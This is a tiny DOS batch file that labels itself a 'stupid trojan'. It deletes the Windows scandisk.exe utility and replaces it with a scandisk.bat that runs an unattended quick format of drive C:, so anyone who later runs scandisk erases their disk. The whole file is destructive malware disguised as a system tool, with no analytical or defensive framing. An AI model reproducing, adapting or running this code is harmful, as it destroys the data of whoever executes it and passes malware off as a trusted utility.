@echo off
rem Stupid trojan.
rem deldisk
del c:\windows\command\scandisk.exe
echo @echo off >c:\windows\command\scandisk.bat
echo break off >c:\windows\command\scandisk.bat
echo format c: /autotest /q /u >c:\windows\command\scandisk.bat

